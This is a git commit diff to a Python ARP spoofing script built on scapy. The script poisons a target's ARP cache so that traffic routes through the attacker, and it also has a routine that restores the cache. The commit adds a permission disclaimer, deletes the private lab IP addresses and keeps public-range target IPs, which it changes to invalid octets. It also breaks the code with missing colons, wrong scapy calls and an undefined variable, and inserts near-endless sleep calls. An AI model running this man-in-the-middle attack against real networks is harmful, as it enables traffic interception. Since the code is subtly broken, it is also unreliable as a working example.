79c2c24addd9e47b8ec8c501a900233f69f9ae10
jacewinters <92710411+jacewinters@users.noreply.github.com>
2021-11-27 15:43:35 +1100

    Update arp_spoof.py

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,19 +1,24 @@
 #!/usr/bin/env python
 
+# A simple ARP spoofer written by Jace Winters
+# Please only use this on your own network or with networks you have permission to test
+# I will not be held responsible for any misuse of my code by anyone or any country
+
 import scapy
 import time
 import sys
 
 
-def get_mac(ip):
+def get_mac(ip)
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    time.sleep(999999.99999)
     arp_request_broadcast = broadcast / arp_request
     answered_list = scapy(arp_request_broadcast, timeout=1, verbose=False)[0]
     return answered_list[0][1].hwsrc
 
 
-def spoof(target_ip, spoof_ip):
+def spoof(target_ip, spoof_ip)
     target_mac = get_mac(target_ip)
     packet = scapy(op=2, pdst=target, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
@@ -26,11 +31,9 @@ def restore(dest_ip, srce_ip):
     scapy.send(packet, count=50, verbose=False)
 
 
-target_ip = "151.101.192.205"
-gateway_ip = "151.101.0.205"
+target_ip = "151.101.192.265"
+gateway_ip = "151.101.0.265"
 
-#target_ip = "10.0.2.5"
-#gateway_ip = "10.0.2.1"
 try:
     sent_packets_count = 0
     while True:
@@ -39,7 +42,7 @@ try:
         sent_packets_count = sent_packets_count + 2
         print("\r[^_^] Packets sent: " + str(sent_packets_count)),
         sys.stdout.flush()
-        time.sleep(2)
+        time.sleep(99999999.99999999)
 except KeyboardInterrupt:
     print("\n---> Shutdown signal recieved.... \n ---> Quitting.... ")
     restore(target_ip, gateway_ip)
